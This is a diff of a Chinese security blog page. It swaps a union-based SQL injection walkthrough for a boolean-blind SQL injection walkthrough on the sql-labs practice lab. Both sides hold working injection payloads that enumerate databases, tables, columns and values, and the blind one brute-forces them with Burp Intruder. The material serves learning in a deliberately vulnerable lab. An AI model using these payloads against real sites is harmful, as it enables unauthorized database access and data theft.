@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="（三）SQL注入—联合注入实操, Wkai">
+    <meta name="keywords" content="（四）SQL注入—布尔注入, Wkai">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>（三）SQL注入—联合注入实操 | Wkai</title>
+    <title>（四）SQL注入—布尔注入 | Wkai</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -201,12 +201,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(5).png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/2020/08/19/%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(4).png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">（三）SQL注入—联合注入实操</h1>
+                    <h1 class="description center-align post-title">（四）SQL注入—布尔注入</h1>
                 </div>
             </div>
         </div>
@@ -344,7 +344,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-08-18
+                    2020-08-19
                 </div>
                 
 
@@ -361,104 +361,130 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <ul>
-<li>在学习了部分联合注入的原理后，还没有真正实操过，所以搭建了个sql-labs的靶场实践下，发现没有实操过果然还是会遗漏许多细节的，本篇主要总结了下联合注入的实操，如何一步一步地从数据库名到列出字段值</li>
-<li>我选择的是靶场sql-labs的第一关，因为比较简单</li>
-<li>为了能够更加清晰地找出问题所在，需要改下靶场源码，让靶场能够有回显</li>
+<li>有时候页面一个显示位都不给，这样就无法通过联合注入查询信息了，只能通过页面返回信息的真假条件判断是否存在注入，就像这样</li>
 </ul>
-<pre class=" language-php"><code class="language-php">首先找到<span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-在底下加入 <span class="token keyword">echo</span> <span class="token string">"有效输入："</span><span class="token punctuation">.</span><span class="token variable">$id</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
-然后找到 <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span><span class="token punctuation">;</span>
-在底下加入 <span class="token keyword">echo</span> <span class="token string">"执行的sql语句"</span><span class="token punctuation">.</span><span class="token string">"$sql"</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span></code></pre>
+<p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(4).png" alt></p>
 <ul>
-<li>加入了之后页面是这样的，拥有输入回显和SQL语句回显</li>
+<li>本篇用的靶场是<code>sql-labs</code>的第六关布尔注入</li>
+<li>先看看数据库的结构</li>
 </ul>
-<p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(5).png" alt></p>
+<p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(17).png" alt></p>
 <ul>
-<li>首先我们尝试单引号<code>&#39;</code>报错回显，发现是可以造成SQL语法错误的</li>
+<li>表<code>emails</code>的数据</li>
 </ul>
-<p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(9).png" alt></p>
+<p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(12).png" alt></p>
 <ul>
-<li>然后我们尝试下<code>?id=1&#39; and 1=1#</code>,然后问题就出来了，<code>#</code>并没有注释掉后面的内容</li>
-</ul>
-<p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(6).png" alt></p>
-<ul>
-<li>OK，那<code>#</code>不行，那我们尝试下<code>--</code>，然而很遗憾，依旧是注释不掉后面的内容</li>
-</ul>
-<p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(2).png" alt></p>
-<ul>
-<li>后来我看了下别人的方法，才发现很多细节是我没学到的</li>
-<li>比如HTTP请求中不包括<code>#</code></li>
-</ul>
-<p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(10).png" alt="通过抓包可以证明请求包中确实不会出现#"></p>
-<ul>
-<li>所以想用到<code>#</code>注释，必须要先将<code>#</code>经过URL编码，<code>#</code>的URL编码是%23</li>
-</ul>
-<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">23</span>
-这里必须注意<span class="token operator">and</span>两边必须有空格，否则语句将会不成立</code></pre>
-<p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(7).png" alt></p>
-<ul>
-<li>然后再说说注释符号<code>--</code>，在使用符号<code>--</code>注释的时候，<code>--</code>后面不能跟单引号<code>&#39;</code>，需要用到一个<code>+</code>分格，<code>+</code>在语句中会变成空格，这就是为什么许多人注入的语句后面是<code>--+</code>的原因。</li>
+<li>遇到页面无显示位置的情况我们首先需要判断是否存在注入</li>
+<li>先使用<code>1=1</code>，页面返回正常</li>
 </ul>
 <pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment" spellcheck="true">--+</span></code></pre>
-<p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(13).png" alt></p>
+<p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(5).png" alt></p>
 <ul>
-<li>在踩了这几个坑后就可以开始正式的操作啦</li>
+<li>接着使用<code>1=2</code>，页面返回失败，说明语句不成立，存在注入点</li>
 </ul>
-<br>
-
+<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token comment" spellcheck="true">--+</span></code></pre>
+<p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(22).png" alt></p>
 <ul>
-<li>第一步，利用order by判断字段数量</li>
+<li>然后因为没有显示位，我们无法直接通过<code>database()</code>输出数据库名，需要先判断数据库名的位数</li>
 </ul>
-<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span><span class="token comment" spellcheck="true">--+</span></code></pre>
-<p>&emsp;在<code>order by</code>还是<code>3</code>的时候，页面还是显示正常的</p>
-<p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(8).png" alt></p>
-<p>&emsp;到<code>4</code>的时候页面就出错了</p>
-<p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(1).png" alt></p>
-<p>&emsp;说明调用的这张表，它只有三个字段</p>
+<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> length<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">1</span><span class="token comment" spellcheck="true">--+</span>
+?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> length<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">2</span><span class="token comment" spellcheck="true">--+</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+这句话是判断数据库名的长度，如果成立将会返回正常页面，通过不断的增加数字，得到数据库名的位数</code></pre>
+<p>&emsp;为了能够有效率，我们可以通过抓包爆破出数据库名的位数</p>
+<p>&emsp;将抓到的请求包发送到<code>intruder</code>，然后选择需要爆破的位置，爆破模式选择为<code>Sniper</code>（狙击手模式），只爆破一个位置</p>
+<p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(6).png" alt></p>
+<p>&emsp;然后<code>payload</code>选择为列表类型导入数字<code>0-9</code>，具体数字还可以再加，毕竟长度多长谁也说不准</p>
+<p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(10).png" alt></p>
+<p>&emsp;爆破出结果后按照降序排序，可以看到当数字到达<code>9</code>的时候，页面出现了变化，说明数据库名的长度为<code>8</code></p>
+<p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(23).png" alt></p>
 <ul>
-<li>第二步，利用联合注入判断显示位置，看看哪个字段可以显示在页面上</li>
+<li>得到数据库名的长度还不够，这只是为了能够效率地爆破出数据库名</li>
 </ul>
-<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment" spellcheck="true">--+</span></code></pre>
-<p>&emsp;结果只有2和3才能显示在页面上</p>
-<p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(12).png" alt></p>
-<ul>
-<li>第三步，查看数据库信息,将显示位3替换为其他信息的查询</li>
-</ul>
-<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,2,CONCAT_WS('</span><span class="token operator">|</span>'<span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>@<span class="token variable">@datadir</span><span class="token punctuation">,</span>@<span class="token variable">@version_compile_os</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--+</span>
-
-这里注意，分割符号两边得加引号</code></pre>
-<p>&emsp;可以看到显示位3上输出了许多信息</p>
-<p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(11).png" alt></p>
-<ul>
-<li>第四步，在已知数据库名为security后，列出所有的表名</li>
-</ul>
-<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,2,table_name from information_schema.tables where table_schema='</span>security' <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment" spellcheck="true">--+</span></code></pre>
-<p>&emsp;通过不断变换limit的参数，可以查看不同的表名</p>
-<p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard.png" alt></p>
-<ul>
-<li>第五步，在已知数据库为security且表名为emails的情况下，查看表的字段</li>
-</ul>
-<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,2,column_name from information_schema.columns where table_schema='</span>security<span class="token string">' and table_name='</span>emails' <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment" spellcheck="true">--+</span>
+<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and substr(database(),1,1)='</span><span class="token number">a</span>'<span class="token comment" spellcheck="true">--+</span>
+?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and substr(database(),1,1)='</span><span class="token number">b</span>'<span class="token comment" spellcheck="true">--+</span>
+?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and substr(database(),1,1)='</span><span class="token number">c</span>'<span class="token comment" spellcheck="true">--+</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+通过substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>，可以从字符串<span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>中取数值，从第<span class="token number">1</span>个字符开始，每次只取一个字符
+通过不断变换参数，可以通过返回页面判断第几位是什么字符，比如上面的，如果数据库名第一个字符刚好是<span class="token number">a</span>，那么页面将会返回正确
 </code></pre>
-<p>&emsp;同样的，变换limit的参数，可以查看不同的字段</p>
-<p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(3).png" alt></p>
+<p>&emsp;同样的，我们可以通过Burp来爆破提高效率<br>&emsp;抓包发送到爆破模块，然后选择集束炸弹模式，因为这次爆破的参数是两个</p>
+<p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(15).png" alt></p>
+<p>&emsp;然后选择<code>参数1</code>的payload类型为<code>0-9</code>的数字，<code>参数2</code>的payload类型为字符型<code>a-z</code>，当然有些数据库名会出现下划线等特殊字符，这些可以根据情况去加</p>
+<p>&emsp;最后等待结果，因为是集束炸弹模式，所以时间会较长，完成后先选择<code>payload1</code>升序排序，然后再选择长度升序排序</p>
+<p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(25).png" alt></p>
+<p>&emsp;最后得出的数据库名为<code>security</code></p>
 <ul>
-<li>第六步，已知字段值的情况下，查看表emails的字段值</li>
+<li>接着试出数据库表名</li>
 </ul>
-<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>email_id<span class="token punctuation">)</span> <span class="token keyword">from</span> emails<span class="token comment" spellcheck="true">--+</span></code></pre>
-<p>&emsp;通过group_concat可以列出指定字段的所有值，并且排成一行，默认是逗号分格</p>
-<p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(4).png" alt></p>
+<p>&emsp;前面尝试猜测出数据库名的时候，判断了库名的长度，所以我想先测试出表名的长度，以加快爆破的效率</p>
+<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and length(select table_name from information_schema.tables where table_schema='</span>security' <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">1</span><span class="token comment" spellcheck="true">--+</span></code></pre>
+<p>&emsp;不过还是太天真，这条语句怎么样都不成立，好像length函数里就是没法嵌套select语句，那只能直接跑未知数字，时间长就长点吧</p>
+<p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(19).png" alt></p>
+<p>&emsp;构造爆破表名的payload</p>
+<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and substr((select table_name from information_schema.tables where table_schema='</span>security<span class="token string">' limit 0,1),1,1)='</span><span class="token number">a</span>'<span class="token comment" spellcheck="true">--+</span>
+?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and substr((select table_name from information_schema.tables where table_schema='</span>security<span class="token string">' limit 0,1),1,1)='</span><span class="token number">b</span>'<span class="token comment" spellcheck="true">--+</span>
+?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and substr((select table_name from information_schema.tables where table_schema='</span>security<span class="token string">' limit 0,1),1,1)='</span><span class="token number">c</span>'<span class="token comment" spellcheck="true">--+</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span> 用来指定第一个表名
+substr<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'a'</span>  不断变换字符来猜测表名第一个字符
+</code></pre>
+<p>&emsp;&emsp;通过不断变换<code>substr</code>的参数和对比的字符爆破出表名</p>
+<p>&emsp;&emsp;同样的，抓包发送到爆破模块</p>
+<p>&emsp;&emsp;因为同样有两个参数，所以我们选择集束炸弹模式</p>
+<p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(9).png" alt></p>
+<p>&emsp;&emsp;第一个参数选择<code>1-20</code>，因为我们不知道表名有多长</p>
+<p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(20).png" alt></p>
+<p>&emsp;&emsp;第二个参数选择字母<code>a-z</code>，也可以加些大写字母，因为有些表名首字母是大写的</p>
+<p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(11).png" alt></p>
+<p>&emsp;&emsp;点击攻击按钮开始爆破，结果第一个表名为<code>emails</code></p>
+<p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(1).png" alt></p>
+<p>&emsp;&emsp;通过变换<code>limit</code>的参数，可以爆破第二张表名，表名为<code>referers</code></p>
+<p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(8).png" alt></p>
+<p>&emsp;&emsp;那么爆破出的表名因为不知道位数，会不会因为字典中缺少了某些字符没有爆破出来，该如何验证表名的完整性和正确性呢</p>
+<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and (select table_name from information_schema.tables where table_schema='</span>security<span class="token string">' limit 0,1)='</span>emails'<span class="token comment" spellcheck="true">--+</span></code></pre>
+<p>&emsp;&emsp;如果页面返回正确，即可证明表名是正确的</p>
+<p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(26).png" alt></p>
 <ul>
-<li>总结下<ul>
-<li>联合注入的基本步骤为：查找注入点-&gt;查找显示位-&gt;输出数据库信息-&gt;根据数据库名输出表名-&gt;根据数据库名和表名输出字段名-&gt;根据表名和字段名输出字段值</li>
-<li>数据库<code>information_schema</code>中表<code>tables</code>是用来记录所有表名的，而表<code>columns</code>是用来记录所有字段名的</li>
-<li>请求包不会出现<code>#</code>号，只能经过URL编码</li>
-<li>用–注释，如果后面有单引号，注释是不会生效的，需要插入<code>+</code>号，<code>+</code>会自动转换成空格，所以最好地注释就是<code>--+</code></li>
-<li>SQL语句对空格挺敏感的，一旦该加空格的地方没加空格，语句就会不成立</li>
-<li>在使用CONCAT_WS()的时候，分隔符号两边必须加引号</li>
+<li>有了表名就可以测试出数据库字段名了</li>
 </ul>
-</li>
+<p>&emsp;判断<code>colmun_name</code>其实原理都差不多，都是通过查询数据库里的information_schema`里的字段表去和字符串做匹配，通过返回的页面去辨别</p>
+<p>&emsp;在已知数据库名和表名的情况下，可以用字段表去做字符匹配</p>
+<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and substr((select column_name from information_schema.columns where table_schema='</span>security<span class="token string">' and table_name='</span>emails<span class="token string">' limit 0,1),1,1)='</span><span class="token number">a</span>'<span class="token comment" spellcheck="true">--+</span></code></pre>
+<p>&emsp;同样的操作，抓包爆破</p>
+<p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(3).png" alt></p>
+<p>&emsp;设置类似的payload，爆破字段名，payload越多，爆破时间就越长</p>
+<p>&emsp;爆破结果第一个字段名为<code>id</code><br><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(7).png" alt></p>
+<p>&emsp;第二个字段名为<code>emailid</code>（在爆破第三个字段的时候，如果返回页面全都一样，说明不存在第三个字段了）</p>
+<p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(18).png" alt></p>
+<p>&emsp;然后验证下字段名</p>
+<p>&emsp;首先验证下<code>id</code>的,返回页面正确</p>
+<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and (select column_name from information_schema.columns where table_schema='</span>security<span class="token string">' and table_name='</span>emails<span class="token string">' limit 0,1)='</span>id'<span class="token comment" spellcheck="true">--+</span></code></pre>
+<p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(24).png" alt></p>
+<p>&emsp;然后验证下第二个字段发现并未返回正确的页面，说明缺少了某个字符</p>
+<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and (select column_name from information_schema.columns where table_schema='</span>security<span class="token string">' and table_name='</span>emails<span class="token string">' limit 1,1)='</span>emailid'<span class="token comment" spellcheck="true">--+</span></code></pre>
+<p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(21).png" alt></p>
+<p>&emsp;说明字典选的还不够全，可能需要加下划线，或者其他字符</p>
+<p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(13).png" alt></p>
+<p>&emsp;这里就先加入下划线，如果不行再加入其他字符</p>
+<p>&emsp;爆破的结果中果然出现了下划线，正确的字段名为<code>email_id</code></p>
+<p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard.png" alt></p>
+<p>&emsp;最后再验证下，返回了正确的页面</p>
+<p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(14).png" alt></p>
+<ul>
+<li>有了上面的表名字段字段名，就到了最重要的取数据环节了</li>
 </ul>
+<p>在获取了数据库名，表名，字段名之后，最重要的肯定就是取数值了，因为数据才是最重要的</p>
+<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and substr((select email_id from emails limit 0,1),1,1)='</span><span class="token number">a</span>'<span class="token comment" spellcheck="true">--+</span>
+?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and substr((select email_id from emails limit 0,1),1,1)='</span><span class="token number">b</span>'<span class="token comment" spellcheck="true">--+</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre>
+<p>&emsp;因为数据取值是多种多样的，可能会出现任何字符，而且长度也说不准，所以字典数据可能很多，爆破时间也比较长</p>
+<p>&emsp;这里就先尝试爆破字段email_id的第一个值，可以通过字段的含义去选择字典值</p>
+<p>&emsp;因为是邮箱地址，所以一般是<code>字母（windows下不区分大小写）</code>，<code>@</code>，和点<code>.</code>，还有<code>数字</code></p>
+<p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(16).png" alt></p>
+<p>&emsp;爆破的结果果然是个邮箱：<code>dumb@dhakkan.com</code></p>
+<p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(2).png" alt></p>
+<p>&emsp;最后可以用前面同样的方式去验证字段值的正确性</p>
 
             </div>
             <hr/>
@@ -484,7 +510,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
